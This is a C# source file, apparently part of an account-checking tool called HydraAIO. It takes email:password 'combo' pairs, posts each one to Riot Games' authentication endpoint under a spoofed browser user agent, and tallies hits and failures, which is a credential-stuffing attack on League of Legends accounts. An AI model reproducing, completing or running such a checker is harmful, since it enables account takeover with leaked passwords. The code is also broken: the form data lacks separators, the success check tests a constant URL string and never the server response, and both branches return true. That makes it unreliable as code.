using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace HydraAIO.Modules
{
    internal class lolmodule
    {
        public static bool checklol(string combo)
        {
            using (HttpRequest httpRequest = new HttpRequest())
            {
                string username = combo.Split(':')[0];
                string password = combo.Split(':')[1];

                string data = "email=" + username + "password=" + password;

                CookieContainer cc = new CookieContainer();
                var request2 = (HttpWebRequest)WebRequest.Create("https://auth.riotgames.com/token");

                var postdata = Encoding.ASCII.GetBytes(data);
                request2.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36";
                request2.ContentType = "application/x-www-form-urlencoded";

                request2.ContentLength = data.Length;

                using (var stream = request2.GetRequestStream())
                {
                    stream.Write(postdata, 0, data.Length);
                }
                var response = (HttpWebResponse)request2.GetResponse();

                string html = new StreamReader(response.GetResponseStream()).ReadToEnd();
                string api = "https://auth.riotgames.com/token";

                if (api.Contains("access_token"))
                {
                    ++Program.hits;
                    ++Program.cheked;
                    ++Program.cpm;
                    //Colorful.Console.WriteLine("[+] Hit - " + combo, Color.Green);
                    return true;
                }
                else
                {
                    ++Program.bad;
                    ++Program.cheked;
                    ++Program.cpm;
                    //Colorful.Console.WriteLine("[-] Bad - " + combo, Color.Red);
                    return true;
                }
            }
        }
    }
}
